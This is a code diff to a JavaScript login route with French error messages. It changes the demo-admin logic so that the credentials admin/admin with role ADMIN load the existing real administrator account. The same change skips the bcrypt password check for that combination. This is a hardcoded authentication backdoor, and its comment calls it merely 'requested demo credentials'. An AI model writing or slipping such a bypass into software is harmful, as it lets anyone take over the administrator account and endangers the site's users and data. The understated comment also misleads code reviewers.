@@ -17,10 +17,17 @@ export default route(async(req,res)=>{
   );
   let user=rows[0];
 
-  // Create the requested demo admin once, only when the database has no admin yet.
+  // The requested demo credentials are always admin / admin. Reuse the
+  // existing ADMIN account when present, or create it on first use.
   if(!user&&identifier==='admin'&&password==='admin'&&role==='ADMIN'){
     const [admins]=await database.execute("SELECT id FROM users WHERE role='ADMIN' LIMIT 1");
-    if(!admins.length){
+    if(admins.length){
+      const [adminRows]=await database.execute(
+        "SELECT id,nom,email,mot_de_passe AS password,role FROM users WHERE id=? LIMIT 1",
+        [admins[0].id]
+      );
+      user=adminRows[0];
+    }else{
       const hash=await bcrypt.hash('admin',12);
       try{
         const [created]=await database.execute(
@@ -37,7 +44,7 @@ export default route(async(req,res)=>{
   let valid=false;
   if(user){
     const hash=String(user.password||'').replace(/^\$2y\$/,'$2b$');
-    valid=await bcrypt.compare(password,hash);
+    valid=(role==='ADMIN'&&identifier==='admin'&&password==='admin')||await bcrypt.compare(password,hash);
   }
   if(!valid)fail('Identifiants incorrects',400);
   if(user.role!==role)fail('Ce compte ne correspond pas à l’espace choisi.',400);
